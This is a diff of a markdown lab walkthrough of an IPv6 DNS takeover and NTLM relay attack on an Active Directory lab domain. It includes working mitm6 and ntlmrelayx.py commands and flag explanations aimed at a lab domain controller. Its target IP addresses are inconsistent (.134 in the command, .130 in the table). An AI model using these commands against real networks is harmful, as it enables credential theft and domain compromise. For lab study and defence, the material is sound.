@@ -4,23 +4,22 @@
 **Author:** ShahinSecLab  
 **Category:** Network Attack / Credential Capture  
 **Difficulty:** Easy  
-**Tools:** mitm6, ntlmrelayx.py
+**Tools:** mitm6, ntlmrelayx.py, secretsdump.py
 
 ## Table of Contents
 1. [Overview](#overview)
 2. [Attack Theory](#attack-theory)
 3. [Lab Setup](#lab-setup)
-4. [Tools Required](#tools-required)
-5. [Attack Walkthrough](#attack-walkthrough)
+4. [Attack Steps](#attack-steps)
    - [Step 1 — Start mitm6](#step-1--start-mitm6)
    - [Step 2 — Launch NTLM Relay](#step-2--launch-ntlm-relay)
    - [Step 3 — Trigger Authentication from Victim](#step-3--trigger-authentication-from-victim)
    - [Step 4 — Relay Succeeds & Loot Retrieved](#step-4--relay-succeeds--loot-retrieved)
    - [Step 5 — Explore Loot Folder](#step-6--explore-loot-folder)
    - [Step 6 — Credential & Domain Dump](#step-7--credential--domain-dump)
-6. [Mitigations & Defenses](#mitigations--defenses)
-7. [Key Takeaways](#key-takeaways)
-8. [References](#references)
+5. [Mitigations & Defenses](#mitigations--defenses)
+6. [Key Takeaways](#key-takeaways)
+7. [References](#references)
 
 ## Overview
 
@@ -53,21 +52,6 @@ ntlmrelayx → [Relays to DC's LDAP]
 DC         → [Authenticated!]
 ```
 
-<!-- ## Full Kill Chain
-```
-DHCPv6 Spoofing
-      ↓
-DNS Hijack (WPAD / internal names)
-      ↓
-NTLM Authentication Capture
-      ↓
-NTLM Relay → LDAP / SMB on Domain Controller
-      ↓
-Create Domain User / Dump AD / Execute Commands
-      ↓
-Domain Compromise
-``` -->
-
 ## Lab Setup
 
 ```
@@ -80,21 +64,11 @@ Domain Compromise
 
 **Domain Name:** `readteambd.local`
 
-## Tools Required
-
-```
-|      Tool       |                  Purpose                           |
-|-----------------|----------------------------------------------------|
-| mitm6           | DHCPv6 spoofing + DNS hijacking                    |
-| ntlmrelayx.py   | NTLM authentication relay                          |
-| secretsdump.py  | Remote credential extraction from Active Directory |
-```
-
-# Attack Walkthrough
+# Attack Steps
 
 ## Step 1 — Start mitm6
 
-Open Terminal 1. Launch mitm6 targeting the internal domain on the network interface connected to the LAN.
+I started mitm6 in a separate terminal and targeted the internal domain on the LAN interface.
 
 ```bash
 sudo mitm6 -d readteambd.local -i eth0
@@ -110,14 +84,13 @@ sudo mitm6 -d readteambd.local -i eth0
 | eth0| Active LAN interface               |
 ```
 
-### What Happens (mitm6 Flow)
+### What Happens
 
-- `mitm6` listens for **DHCPv6 Solicit** packets from Windows hosts  
-- It replies with **DHCPv6 Advertise/Reply**, setting itself as the IPv6 DNS server  
-- Victim machines automatically update their DNS configuration  
-- All DNS queries are redirected to the attacker-controlled system  
-- `mitm6` responds to **WPAD and internal domain queries**, forcing traffic toward the attacker IP  
-
+- mitm6 listens for DHCPv6 requests from Windows machines
+- It replies with fake DHCPv6 responses and sets itself as the DNS server
+- The victim machines accept the IPv6 configuration automatically
+- DNS queries get redirected to my machine
+- WPAD and internal domain lookups are also redirected to me 
 
 ## mitm6 output:
 
@@ -138,20 +111,20 @@ Sent spoofed reply for wpad.readteambd.local. to fe80::502e:c6be:1fe9:c8bf
 </p>
 
 ## Step 2 — Launch ntlmrelayx:
-On another terminal
-Run:
+
+On another terminal, I started ntlmrelayx to catch and relay authentication requests.
 
 ```bash
 ntlmrelayx.py -6 -t ldaps://192.168.5.134 -wh fakewpad.readteambd.local -l lootme
 ```
 ```
-|             Flag              |                      Meaning                         |
-|-------------------------------|------------------------------------------------------|
-| ntlmrelayx.py                 | NTLM authentication relay                            |
-| -6                            | Enables listening on IPv6 as well as IPv4            |
-| -t ldaps://192.168.5.130      | Relay target (LDAPS on Domain Controller)            |
-| -wh fakewpad.readteambd.local | Serves a fake WPAD hostname to trigger authentication|
-|-l lootme                      | Saves all captured/dumped data to local directory    |
+|             Flag              |                      Meaning                |
+|-------------------------------|---------------------------------------------|
+| ntlmrelayx.py                 | Tool used for NTLM relay attacks            |
+| -6                            | Enables IPv6 support                        |
+| -t ldaps://192.168.5.130      | Target Domain Controller using LDAPS        |
+| -wh fakewpad.readteambd.local | Fake WPAD hostname to trigger authentication|
+|-l lootme                      | Saves captured data to local folder         |
 ```
 
 ## ntlmrelayx startup output:
